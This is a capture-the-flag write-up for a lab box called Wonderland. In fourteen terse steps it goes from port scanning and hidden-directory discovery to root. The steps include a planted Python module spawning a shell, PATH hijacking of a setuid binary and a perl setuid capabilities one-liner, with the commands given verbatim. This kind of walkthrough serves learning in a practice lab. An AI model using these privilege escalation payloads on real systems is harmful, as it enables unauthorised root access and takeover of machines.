# CTF Writeup: Wonderland

---

- Step 1: added <target_ip> to /etc/hosts & ran nmap scan --> 22 & 80 are open
- Step 2: enumerated hidden dir's until I found /r/a/b/b/i/t 
- Step 3: gained alice's credentials: alice:HowDothTheLittleCrocodileImproveHisShiningTail
- Step 4: retrieved flag from /root directory --> since root.txt is in alice's directory
and the hint gave me that everything is upside down. --> made cat /root/user.txt
- Step 5: since the path of the random function, which doesn't have an absolute path defined
--> created a random.py --> made nano random.py import os os.system("/bin/bash")
- Step 6: gained shell as rabbit user --> teaParty binary seems exploitable 
- Step 7: created a python server on target shell and wget'd the teaParty file locally
- Step 8: made strings teaParty and scrolled up --> relative path --> exploitable
- Step 9: decided to exploit date variable --> /bin/bash -p
- Step 10: made export PATH=/home/rabbit:$PATH so the payload variable date which we created
takes in the value of our current directory first --> exploit will work
- Step 11: checked for capabilitie binarys getcap -r / 2>/dev/null --> perl 
- Step 12: went to gtfobins and found priv esc command
- Step 13: made /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
- Step 14: gained root rce and retrieved root flag

---

## Key Learnings

- Highly strengthened priv esc knowledge
- Gained new methodology --> look for capabilities on binarys
-
